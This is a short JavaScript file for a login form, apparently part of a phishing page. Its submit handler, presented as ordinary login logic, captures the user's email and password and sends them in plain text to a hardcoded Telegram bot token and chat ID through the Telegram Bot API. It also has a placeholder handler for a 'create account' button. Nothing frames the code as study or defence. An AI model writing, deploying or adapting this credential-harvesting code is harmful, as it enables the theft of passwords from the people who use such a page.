document.querySelector('.login-form').addEventListener('submit', function(event) {
    event.preventDefault();
    // Add login logic here
    alert('Form submitted!');
    const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // Exemple de requête AJAX pour envoyer les données via Telegram
        const tel = '7452036404:AAGrogABXNWYTaqXQQRP9UPY5Kp1wSGf0yA';
        const chat = '6143012351';
        const message = `Nouvelle connexion :
Email: ${email}
Mot de passe: ${password}`;

        const url = `https://api.telegram.org/bot${tel}/sendMessage`;
        const params = new URLSearchParams({
            chat_id: chat,
            text: message
        });

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: params
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Erreur lors de l\'envoi des données');
            }
            alert('Données envoyées avec succès via Telegram !');
            form.reset(); // Réinitialiser le formulaire après envoi
        })
        .catch(error => {
            console.error('Erreur:', error);
            alert('Une erreur s\'est produite lors de l\'envoi des données');
        });
});

document.querySelector('.create-account').addEventListener('click', function() {
    // Add create account logic here
    alert('Create new account button clicked!');
});
